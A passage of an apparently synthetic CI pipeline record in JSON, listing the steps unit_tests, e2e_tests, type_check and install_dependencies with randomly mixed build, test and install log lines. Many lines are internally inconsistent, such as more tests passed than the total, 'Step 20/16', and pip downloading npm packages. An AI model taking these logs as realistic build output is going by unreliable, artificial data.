          "Waiting...",
          "pip: Downloading webpack-2.13.tar.gz",
          "POST /upload - 200 (374ms)",
          "Using Python 3.10",
          "[12:20:11] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "Step 11/15: Deploying",
          "yarn add: Done in 22.26s",
          "GET /api - 201 (39ms)",
          "FAILED: test_user_create",
          "npm install: added 76 packages",
          "Step 18/18: Testing",
          "[12:20:11] DEBUG: Initializing service",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=production",
          "\u2713 Task completed in 2572ms",
          "Time: 27.497s",
          "Switched to branch 'feature/task-407'",
          "Ready.",
          "Checking out main branch",
          "Connecting to test.io:443...",
          "Optimizing 17 modules...",
          "Generating source maps...",
          "Test Suites: 43 passed, 23 total",
          "Loading...",
          "POST /upload - 202 (72ms)",
          "Compiling utils/app.ts...",
          "Test Suites: 22 passed, 31 total",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: dist.zip (66MB)",
          "Optimizing 71 modules...",
          "Connection established",
          "Cache saved successfully",
          "Minifying main.js",
          "Artifact uploaded: dist.zip (73MB)",
          "Platform: darwin-arm64",
          "OK",
          "Layer 2/8: COPY command",
          "\u2713 Task completed in 2330ms",
          "Done.",
          "Step 10/20: Running migrations",
          "Snapshots: 41 passed, 34 total",
          "NODE_ENV=development",
          "Generating source maps...",
          "Coverage: 93% statements, 73% branches",
          "Coverage: 75% statements, 63% branches",
          "pip install: Successfully installed eslint-2.12",
          "  PASS: test_auth_login (425ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:11] DEBUG: Connection pool: 11 active",
          "Compiling utils/handler.rs...",
          "\u2713 All checks passed",
          "pip: Downloading express-4.14.tar.gz",
          "Coverage: 96% statements, 90% branches",
          "[12:20:11] DEBUG: Query executed in 14ms",
          "Already up to date.",
          "Bundling vendor.js",
          "  PASS: integration/test_user_create.spec.js",
          "Switched to branch 'feature/task-469'",
          "\u2713 validate completed",
          "\u2717 build failed with exit code 58",
          "GET /health - 204 (9ms)",
          "Artifact uploaded: dist.zip (25MB)",
          "Success!",
          "Artifact uploaded: dist.zip (24MB)",
          "[12:20:11] DEBUG: Query executed in 13ms",
          "WARNING: webpack has known vulnerabilities",
          "Bundling runtime.css",
          "yarn add: Done in 12.81s",
          "Optimizing 44 modules...",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "Exception: TypeError",
          "Compiling components/main.py...",
          "[12:20:11] INFO: Cache refreshed",
          "Completed.",
          "Using Python 3.9",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Switched to branch 'hotfix/task-280'",
          "Generating source maps...",
          "[12:20:11] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (90MB)",
          "Connecting to example.com:443...",
          "[12:20:11] INFO: Request completed",
          "Cache hit for key-2461",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "[12:20:11] INFO: Cache refreshed",
          "HEAD is now at 0249ab5",
          "Ran 199 tests in 14s",
          "[12:20:11] INFO: Starting build process",
          "Connection established",
          "pip: Downloading lodash-3.9.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: python:3.11",
          "[12:20:11] DEBUG: Initializing service",
          "Exception: NullPointerException",
          "WARNING: webpack has known vulnerabilities",
          "Test Suites: 5 passed, 28 total",
          "[12:20:11] INFO: Request completed",
          "Compiling lib/main.py...",
          "\u2713 Step 'install' succeeded",
          "FAILED: test_auth_login",
          "Done.",
          "Step 7/19: Deploying",
          "Pulling image: node:3.11",
          "\u2713 Step 'setup' succeeded",
          "Image pulled successfully",
          "Using Node.js 14.19.9",
          "Installing jest@3.0.1",
          "Ran 89 tests in 43s",
          "Tests: 172 passed, 436 total",
          "Fetching submodules...",
          "FAILED: test_api_health",
          "Exception: RuntimeError",
          "Connecting to startup.dev:443...",
          "\u2713 deploy completed",
          "Finished.",
          "Verifying...",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 8/23: Running migrations",
          "WARNING: lodash has known vulnerabilities",
          "OK",
          "Cache saved successfully",
          "Time: 103.386s",
          "Done.",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] INFO: Processing request",
          "Step 11/16: Running migrations",
          "Cache saved successfully",
          "NODE_ENV=production",
          "Compiling lib/utils.go...",
          "NODE_ENV=development",
          "Step 7/22: Linting",
          "Cache miss for key-2037",
          "[12:20:11] DEBUG: Query executed in 96ms",
          "Finished.",
          "Processing...",
          "Time: 55.734s",
          "[12:20:11] DEBUG: Query executed in 93ms",
          "Compiling utils/app.ts...",
          "Step 3/17: Testing",
          "Finished.",
          "\u2713 Task completed in 1749ms",
          "Snapshots: 22 passed, 33 total",
          "npm install: resolved 830 packages",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact downloaded: 33MB",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 11/18: Running migrations",
          "Completed.",
          "pip: Downloading webpack-3.10.tar.gz",
          "\u2717 build failed with exit code 114",
          "Uploading artifact 'dist' (29 files)",
          "\u2713 Step 'test' succeeded",
          "Image pulled successfully",
          "Loading...",
          "GET /status - 201 (89ms)",
          "Waiting...",
          "Time: 6.455s",
          "\u2713 Step 'checkout' succeeded",
          "npm install: resolved 1780 packages",
          "Pushing to registry...",
          "Coverage: 98% statements, 73% branches",
          "Platform: win32-x64",
          "Test Suites: 37 passed, 22 total",
          "pip: Downloading lodash-5.0.tar.gz",
          "  PASS: test_api_health (409ms)",
          "Building Docker image...",
          "pip: Collecting webpack",
          "Coverage: 99% statements, 88% branches",
          "[12:20:11] INFO: Cache refreshed",
          "Cache hit for key-5508",
          "pip: Downloading axios-4.14.tar.gz",
          "[12:20:11] INFO: Cache refreshed",
          "Artifact downloaded: 11MB",
          "  PASS: e2e/test_api_health.spec.js",
          "Using Node.js 18.11.10",
          "HEAD is now at 09d933b",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] INFO: Processing request",
          "Snapshots: 28 passed, 50 total",
          "Artifact uploaded: dist.zip (94MB)",
          "OK",
          "pip: Downloading express-1.1.tar.gz",
          "Done.",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] DEBUG: Query executed in 79ms",
          "[12:20:11] DEBUG: Query executed in 50ms",
          "Compiling utils/main.py...",
          "Optimizing 48 modules...",
          "Cache restored successfully (377MB)",
          "Compiling utils/service.java...",
          "npm notice: created a lockfile",
          "npm install: resolved 501 packages",
          "Environment: staging",
          "pip: Downloading axios-1.13.tar.gz",
          "Step 8/20: Deploying",
          "TLS handshake completed",
          "[12:20:11] DEBUG: Query executed in 46ms",
          "Artifact downloaded: 36MB",
          "Ready.",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Ran 86 tests in 18s",
          "Switched to branch 'feature/task-194'",
          "Exception: ValueError",
          "Installing lodash@1.3.9",
          "Success!",
          "Layer 4/9: RUN command",
          "pip install: Successfully installed prettier-2.16",
          "Cache restored successfully (238MB)",
          "Optimizing 78 modules...",
          "Layer 10/13: ENV command",
          "Using Python 3.12",
          "Artifact uploaded: dist.zip (36MB)",
          "npm install: resolved 769 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/18: Building",
          "Waiting...",
          "Creating production build...",
          "[12:20:11] INFO: Starting build process",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "Ran 76 tests in 47s",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-05T12:21:06.164581",
        "finished_at": "2025-12-05T12:21:15.982653",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:20:11] INFO: Cache refreshed",
          "Bundling styles.js",
          "Artifact downloaded: 30MB",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "pip: Downloading eslint-5.11.tar.gz",
          "OK",
          "Verifying...",
          "Ran 111 tests in 39s",
          "Loading...",
          "npm install: resolved 1184 packages",
          "GET /api - 204 (42ms)",
          "\u2713 Step 'install' succeeded",
          "Bundling styles.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (218ms)",
          "npm install: resolved 776 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: darwin-arm64",
          "\u2713 package completed",
          "WARNING: express has known vulnerabilities",
          "Processing...",
          "Pulling image: python:latest",
          "Step 14/19: Installing dependencies",
          "Layer 7/10: RUN command",
          "pip: Installing build dependencies...",
          "Platform: linux-x64",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "HEAD is now at 7b596c2",
          "WARNING: express has known vulnerabilities",
          "GET /health - 200 (87ms)",
          "Using Node.js 16.8.0",
          "Cache invalidated: node_modules",
          "Step 16/20: Testing",
          "[12:20:11] INFO: Starting build process",
          "Ran 33 tests in 6s",
          "Generating source maps...",
          "pip: Collecting jest",
          "Minifying app.js",
          "Time: 94.476s",
          "Cache hit for key-9551",
          "POST /api - 200 (452ms)",
          "WARNING: express has known vulnerabilities",
          "Building Docker image...",
          "Layer 8/10: RUN command",
          "[12:20:11] DEBUG: Query executed in 10ms",
          "[12:20:11] DEBUG: Connection pool: 7 active",
          "Snapshots: 40 passed, 50 total",
          "Building Docker image...",
          "OK",
          "Cache invalidated: node_modules",
          "Already up to date.",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "\u2713 All checks passed",
          "OK",
          "[12:20:11] DEBUG: Loading configuration",
          "Success!",
          "Connecting to example.com:443...",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] WARN: Deprecated API usage",
          "Success!",
          "Completed.",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:11] DEBUG: Connection pool: 15 active",
          "Using Python 3.11",
          "Connection established",
          "Uploading artifact 'dist' (2 files)",
          "pip install: Successfully installed webpack-4.14",
          "[12:20:11] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Step 19/22: Building",
          "Connection established",
          "\u2713 All checks passed",
          "Compiling components/app.ts...",
          "Ran 117 tests in 42s",
          "TLS handshake completed",
          "Installing eslint@2.1.3",
          "Bundling runtime.js",
          "Ran 190 tests in 54s",
          "Completed.",
          "\u2713 All checks passed",
          "Processing...",
          "[12:20:11] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (97MB)",
          "Step 5/22: Installing dependencies",
          "[12:20:11] DEBUG: Connection pool: 2 active",
          "Minifying vendor.js",
          "[12:20:11] WARN: Deprecated API usage",
          "Bundling styles.js",
          "Exception: TypeError",
          "Optimizing 23 modules...",
          "\u2713 Task completed in 4921ms",
          "Completed.",
          "Switched to branch 'bugfix/task-590'",
          "[12:20:11] WARN: Deprecated API usage",
          "Cache restored successfully (100MB)",
          "Using Python 3.12",
          "OK",
          "Tests: 190 passed, 311 total",
          "Finished.",
          "Step 20/24: Running migrations",
          "Verifying...",
          "pip: Installing build dependencies...",
          "Step 8/21: Installing dependencies",
          "Creating production build...",
          "Environment: staging",
          "Artifact downloaded: 19MB",
          "HEAD is now at 91ff2b0",
          "npm install: resolved 1104 packages",
          "Environment: development",
          "Connection established",
          "npm install: added 51 packages",
          "[12:20:11] INFO: Request completed",
          "Step 4/23: Running migrations",
          "  PASS: integration/test_user_create.spec.js",
          "GET /status - 201 (21ms)",
          "GET /health - 201 (22ms)",
          "  PASS: unit/test_auth_login.spec.js",
          "Compiling components/service.java...",
          "  PASS: e2e/test_user_create.spec.js",
          "npm install: added 178 packages",
          "Processing...",
          "Cache restored successfully (419MB)",
          "Generating source maps...",
          "[12:20:11] ERROR: Connection failed",
          "Time: 64.674s",
          "Exception: NullPointerException",
          "Artifact uploaded: dist.zip (60MB)",
          "WARNING: jest has known vulnerabilities",
          "Installing lodash@3.4.0",
          "pip: Collecting express",
          "[12:20:11] WARN: Deprecated API usage",
          "Cache miss for key-2890",
          "Ready.",
          "POST /data - 200 (52ms)",
          "pip install: Successfully installed axios-4.15",
          "[12:20:11] WARN: Deprecated API usage",
          "Already up to date.",
          "Bundling main.js",
          "NODE_ENV=production",
          "Cache hit for key-1157",
          "Transforming 924 files...",
          "  PASS: unit/test_auth_login.spec.js",
          "Artifact uploaded: dist.zip (70MB)",
          "Step 20/16: Linting",
          "  PASS: test_user_create (381ms)",
          "\u2713 Step 'test' succeeded",
          "Step 17/19: Installing dependencies",
          "pip install: Successfully installed lodash-2.7",
          "WARNING: jest has known vulnerabilities",
          "[12:20:11] INFO: Cache refreshed",
          "Compiling lib/handler.rs...",
          "[12:20:11] DEBUG: Loading configuration",
          "Processing...",
          "npm install: added 10 packages",
          "OK",
          "Test Suites: 48 passed, 17 total",
          "Step 1/25: Linting",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Minifying vendor.js",
          "Cache miss for key-5462",
          "npm notice: created a lockfile",
          "Ran 83 tests in 39s",
          "Building Docker image...",
          "Test Suites: 49 passed, 8 total",
          "[12:20:11] WARN: Deprecated API usage",
          "Optimizing 12 modules...",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] INFO: Processing request",
          "OK",
          "\u2717 build failed with exit code 48",
          "Time: 118.768s",
          "Pushing to registry...",
          "[12:20:11] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Step 11/20: Running migrations",
          "Coverage: 81% statements, 88% branches",
          "Generating source maps...",
          "Building Docker image...",
          "Compiling lib/utils.go...",
          "Platform: linux-x64",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 11/22: Running migrations",
          "Minifying app.js",
          "Completed.",
          "Finished.",
          "[12:20:11] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:11] INFO: Cache refreshed",
          "FAILED: test_db_connect",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Using Node.js 18.11.4",
          "Cache saved successfully",
          "Cache saved successfully",
          "Snapshots: 37 passed, 20 total",
          "GET /health - 204 (68ms)",
          "OK",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 17/15: Linting",
          "[12:20:11] INFO: Connecting to database",
          "Minifying app.js",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (26MB)",
          "pip: Installing build dependencies...",
          "Step 19/17: Testing",
          "  PASS: test_user_create (224ms)",
          "Step 2/19: Testing",
          "Compiling lib/app.ts...",
          "Test Suites: 21 passed, 21 total",
          "Step 12/19: Linting",
          "Creating production build...",
          "Tests: 500 passed, 129 total",
          "Cache miss for key-4997",
          "\u2713 package completed",
          "Uploading artifact 'dist' (42 files)",
          "Cache invalidated: build",
          "Completed.",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Query executed in 81ms",
          "Layer 10/10: ENV command",
          "[12:20:11] DEBUG: Memory usage: 1012MB",
          "Environment: test",
          "pip: Collecting prettier",
          "npm notice: created a lockfile",
          "Done.",
          "pip: Collecting jest",
          "[12:20:11] WARN: Deprecated API usage",
          "Pulling image: alpine:latest",
          "Transforming 413 files...",
          "yarn add: Done in 1.51s",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 810 files...",
          "Step 2/21: Installing dependencies",
          "Using Node.js 16.7.2",
          "\u2713 Task completed in 4835ms",
          "Loading...",
          "Compiling components/handler.rs...",
          "yarn add: Done in 5.62s",
          "npm install: resolved 533 packages",
          "Layer 9/13: COPY command",
          "Creating production build...",
          "[12:20:11] DEBUG: Loading configuration",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-05T12:21:15.982653",
        "finished_at": "2025-12-05T12:21:25.800725",
        "log_lines": [
          "=== Step: type_check ===",
          "Minifying app.js",
          "Switched to branch 'bugfix/task-107'",
          "Installing webpack@4.3.2",
          "[12:20:11] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (61MB)",
          "Artifact downloaded: 25MB",
          "Processing...",
          "Cache hit for key-6755",
          "WARNING: react has known vulnerabilities",
          "NODE_ENV=test",
          "Completed.",
          "Step 9/18: Installing dependencies",
          "[12:20:11] DEBUG: Connection pool: 20 active",
          "Snapshots: 19 passed, 2 total",
          "POST /api - 202 (313ms)",
          "Platform: win32-x64",
          "Checking out main branch",
          "Completed.",
          "[12:20:11] DEBUG: Query executed in 53ms",
          "Coverage: 100% statements, 84% branches",
          "Finished.",
          "[12:20:11] DEBUG: Query executed in 79ms",
          "Optimizing 52 modules...",
          "Step 15/23: Installing dependencies",
          "Checking out main branch",
          "Using Python 3.10",
          "Compiling utils/utils.go...",
          "NODE_ENV=production",
          "\u2713 All checks passed",
          "\u2713 Task completed in 682ms",
          "Already up to date.",
          "Exception: ValueError",
          "\u2713 Task completed in 2827ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/22: Building",
          "Done.",
          "Compiling src/handler.rs...",
          "Uploading artifact 'build' (25 files)",
          "GET /status - 204 (57ms)",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Creating production build...",
          "pip: Collecting jest",
          "Compiling utils/handler.rs...",
          "Test Suites: 28 passed, 38 total",
          "Step 3/15: Installing dependencies",
          "Verifying...",
          "Cache saved successfully",
          "NODE_ENV=development",
          "Fetching submodules...",
          "Ready.",
          "[12:20:11] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "[12:20:11] DEBUG: Loading configuration",
          "Minifying app.js",
          "Already up to date.",
          "Image pulled successfully",
          "Cache hit for key-7192",
          "npm install: resolved 1303 packages",
          "Compiling utils/utils.go...",
          "[12:20:11] INFO: Cache refreshed",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: dist.zip (33MB)",
          "Layer 4/9: COPY command",
          "pip: Collecting express",
          "Compiling lib/service.java...",
          "Optimizing 47 modules...",
          "Creating production build...",
          "Transforming 292 files...",
          "Compiling lib/main.py...",
          "pip: Installing build dependencies...",
          "Step 15/24: Testing",
          "Pulling image: node:latest",
          "Compiling components/utils.go...",
          "Step 10/25: Testing",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out master branch",
          "TLS handshake completed",
          "[12:20:11] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Fetching submodules...",
          "[12:20:11] WARN: Deprecated API usage",
          "Environment: development",
          "Uploading artifact 'coverage' (19 files)",
          "Layer 2/13: COPY command",
          "  PASS: integration/test_user_create.spec.js",
          "Pushing to registry...",
          "HEAD is now at 3580bb1",
          "[12:20:11] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "POST /data - 202 (399ms)",
          "Time: 70.529s",
          "OK",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Ran 55 tests in 46s",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] DEBUG: Loading configuration",
          "[12:20:11] INFO: Starting build process",
          "Cache restored successfully (313MB)",
          "Minifying main.js",
          "Step 17/16: Installing dependencies",
          "npm install: added 151 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 7/13: COPY command",
          "WARNING: webpack has known vulnerabilities",
          "Processing...",
          "Pulling image: python:latest",
          "Test Suites: 39 passed, 39 total",
          "Fetching submodules...",
          "Step 14/21: Installing dependencies",
          "Done.",
          "[12:20:11] INFO: Processing request",
          "Building Docker image...",
          "\u2713 Task completed in 2267ms",
          "Cache hit for key-7860",
          "[12:20:11] DEBUG: Memory usage: 1170MB",
          "Already up to date.",
          "[12:20:11] DEBUG: Loading configuration",
          "Step 14/21: Running migrations",
          "\u2713 All checks passed",
          "Step 8/25: Building",
          "Switched to branch 'bugfix/task-746'",
          "Bundling main.js",
          "Cache restored successfully (450MB)",
          "Layer 10/9: ENV command",
          "Cache invalidated: dependencies",
          "Time: 111.688s",
          "[12:20:11] INFO: Processing request",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 65 modules...",
          "Environment: development",
          "[12:20:11] INFO: Starting build process",
          "Connection established",
          "Using Python 3.11",
          "Layer 1/10: ENV command",
          "pip: Installing build dependencies...",
          "yarn add: Done in 30.95s",
          "Cache hit for key-1656",
          "\u2713 Task completed in 4887ms",
          "pip install: Successfully installed axios-2.15",
          "Step 4/23: Linting",
          "[12:20:11] INFO: Starting build process",
          "Uploading artifact 'build' (11 files)",
          "Ready.",
          "Building Docker image...",
          "[12:20:11] DEBUG: Memory usage: 1818MB",
          "Installing axios@4.20.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 205 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/utils.go...",
          "Minifying app.js",
          "Artifact uploaded: dist.zip (87MB)",
          "TLS handshake completed",
          "GET /api - 204 (78ms)",
          "Compiling components/handler.rs...",
          "Step 7/16: Deploying",
          "Step 17/23: Building",
          "[12:20:11] INFO: Request completed",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Query executed in 76ms",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] DEBUG: Connection pool: 6 active",
          "Using Python 3.11",
          "Cache hit for key-3578",
          "[12:20:11] INFO: Request completed",
          "Fetching submodules...",
          "[12:20:11] INFO: Starting build process",
          "Ran 40 tests in 1s",
          "Compiling lib/index.js...",
          "Test Suites: 16 passed, 10 total",
          "Step 9/19: Installing dependencies",
          "Step 4/16: Installing dependencies",
          "WARNING: express has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "[12:20:11] INFO: Processing request",
          "Bundling runtime.css",
          "[12:20:11] WARN: Deprecated API usage",
          "Bundling main.css",
          "Completed.",
          "pip install: Successfully installed react-5.20",
          "pip: Installing build dependencies...",
          "Layer 2/15: COPY command",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 16/17: Running migrations",
          "Done.",
          "\u2717 build failed with exit code 11",
          "Step 8/21: Building",
          "Ready.",
          "pip: Collecting lodash",
          "Using Node.js 19.9.8",
          "Platform: win32-x64",
          "Artifact uploaded: dist.zip (58MB)",
          "Waiting...",
          "Artifact downloaded: 5MB",
          "Already up to date.",
          "yarn add: Done in 7.22s",
          "Compiling utils/app.ts...",
          "Step 1/17: Deploying",
          "Waiting...",
          "Cache restored successfully (242MB)",
          "Cache invalidated: node_modules",
          "Waiting...",
          "Using Node.js 14.4.6",
          "Cache restored successfully (117MB)",
          "NODE_ENV=test",
          "Bundling main.css",
          "OK",
          "pip: Collecting lodash",
          "[12:20:11] INFO: Request completed",
          "Switched to branch 'feature/task-524'",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Pulling image: alpine:latest",
          "pip: Downloading express-5.13.tar.gz",
          "Test Suites: 40 passed, 13 total",
          "  PASS: test_cache_hit (291ms)",
          "Generating source maps...",
          "OK",
          "Installing axios@2.6.5",
          "pip: Downloading express-4.6.tar.gz",
          "pip: Downloading lodash-1.0.tar.gz",
          "Connecting to example.com:443...",
          "Compiling utils/app.ts...",
          "[12:20:11] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "[12:20:11] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "Cache restored successfully (491MB)",
          "Platform: darwin-arm64",
          "Bundling styles.js",
          "Fetching submodules...",
          "Step 3/23: Installing dependencies",
          "Done.",
          "[12:20:11] DEBUG: Loading configuration",
          "Transforming 721 files...",
          "Transforming 127 files...",
          "[12:20:11] INFO: Cache refreshed",
          "Already up to date.",
          "\u2713 Task completed in 2036ms",
          "[12:20:11] WARN: Deprecated API usage",
          "Transforming 514 files...",
          "NODE_ENV=test",
          "Cache miss for key-5974",
          "npm notice: package.json updated",
          "WARNING: lodash has known vulnerabilities",
          "Pulling image: python:latest",
          "\u2713 Task completed in 2283ms",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-05T12:21:25.800725",
        "finished_at": "2025-12-05T12:21:55.254942",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Compiling lib/main.py...",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Compiling utils/service.java...",
          "Cache hit for key-7819",
          "TLS handshake completed",
          "Compiling components/utils.go...",
          "Using Python 3.11",
          "Finished.",
          "Processing...",
          "Finished.",
          "Ran 104 tests in 26s",
          "Using Node.js 16.16.1",
          "Step 15/23: Linting",
          "\u2713 Step 'checkout' succeeded",
          "[12:20:11] DEBUG: Connection pool: 18 active",
          "  PASS: test_user_create (160ms)",
          "Compiling components/service.java...",
          "npm notice: created a lockfile",
          "WARNING: lodash has known vulnerabilities",
          "Uploading artifact 'coverage' (7 files)",
          "Ran 91 tests in 7s",
          "  PASS: test_cache_hit (457ms)",
          "Artifact downloaded: 20MB",
          "Compiling utils/handler.rs...",
          "[12:20:11] INFO: Processing request",
          "[12:20:11] ERROR: Connection failed",
          "Checking out master branch",
          "pip: Installing build dependencies...",
          "Using Node.js 14.7.10",
          "Already up to date.",
          "Ready.",
          "Connection established",
          "Transforming 617 files...",
          "[12:20:11] DEBUG: Query executed in 88ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 19/18: Testing",
          "Uploading artifact 'coverage' (2 files)",
          "Platform: win32-x64",
          "Layer 1/9: RUN command",
          "pip install: Successfully installed react-3.6",
          "Step 10/20: Running migrations",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:11] DEBUG: Connection pool: 19 active",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] DEBUG: Memory usage: 532MB",
          "Generating source maps...",
          "Step 13/15: Building",
          "Finished.",
          "[12:20:11] DEBUG: Initializing service",
          "pip: Collecting jest",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Cache restored successfully (242MB)",
          "Tests: 133 passed, 377 total",
          "Step 4/15: Installing dependencies",
          "pip: Collecting webpack",
          "Ran 15 tests in 54s",
          "[12:20:11] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at cb7e409",
          "[12:20:11] INFO: Connecting to database",
          "Environment: staging",
          "NODE_ENV=production",
          "Connecting to test.io:443...",
          "[12:20:11] DEBUG: Loading configuration",
          "Step 10/25: Installing dependencies",
          "Ran 141 tests in 24s",
          "Artifact uploaded: dist.zip (4MB)",
          "npm notice: package.json updated",
          "Compiling src/main.py...",
          "GET /status - 201 (13ms)",
          "Connection established",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Pulling image: python:latest",
          "Cache saved successfully",
          "Step 2/21: Installing dependencies",
          "Tests: 142 passed, 68 total",
          "Loading...",
          "[12:20:11] ERROR: Connection failed",
          "Coverage: 75% statements, 89% branches",
          "npm notice: created a lockfile",
          "Tests: 304 passed, 146 total",
          "Step 16/21: Testing",
          "Loading...",
          "Compiling utils/utils.go...",
          "Cache miss for key-3961",
          "Cache restored successfully (397MB)",
          "Cache invalidated: build",
          "Creating production build...",
          "Minifying app.js",
          "Step 17/15: Building",
          "[12:20:11] DEBUG: Connection pool: 12 active",
          "Minifying main.js",
          "Using Python 3.9",
          "Step 17/21: Building",
          "Compiling lib/utils.go...",
          "Layer 2/8: COPY command",
          "pip: Collecting react",
          "Ready.",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "Step 11/21: Running migrations",
          "Transforming 865 files...",
          "Layer 6/14: RUN command",
          "Connecting to cloud.services:443...",
          "Bundling runtime.js",
          "Already up to date.",
          "Step 3/22: Deploying",
          "Cache miss for key-3510",
          "Connecting to startup.dev:443...",
          "[12:20:11] DEBUG: Memory usage: 1534MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "Ready.",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Image pulled successfully",
          "[12:20:11] ERROR: Connection failed",
          "Cache restored successfully (442MB)",
          "Pulling image: alpine:18",
          "Cache restored successfully (280MB)",
          "Artifact uploaded: dist.zip (11MB)",
          "Bundling runtime.css",
          "Cache miss for key-1125",
          "pip: Collecting jest",
          "[12:20:11] DEBUG: Memory usage: 1148MB",
          "Image pulled successfully",
          "Using Python 3.10",
          "[12:20:11] DEBUG: Connection pool: 9 active",
          "[12:20:11] DEBUG: Connection pool: 8 active",
          "Cache invalidated: build",
          "npm notice: created a lockfile",
          "Step 1/18: Linting",
          "npm install: added 161 packages",
          "[12:20:11] ERROR: Connection failed",
          "Ready.",
          "[12:20:11] DEBUG: Loading configuration",
          "[12:20:11] INFO: Request completed",
          "Platform: linux-x64",
          "[12:20:11] ERROR: Connection failed",
          "Verifying...",
          "[12:20:11] DEBUG: Query executed in 42ms",
          "  PASS: test_auth_login (141ms)",
          "Platform: darwin-arm64",
          "HEAD is now at c5731d1",
          "Bundling vendor.js",
          "Verifying...",
          "Connection established",
          "\u2713 Task completed in 2839ms",
          "Transforming 209 files...",
          "Compiling lib/handler.rs...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache miss for key-7608",
          "Tests: 151 passed, 286 total",
          "pip: Collecting axios",
          "Waiting...",
          "[12:20:11] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:11] WARN: Deprecated API usage",
          "Installing axios@4.11.9",
          "pip: Downloading express-5.11.tar.gz",
          "Finished.",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
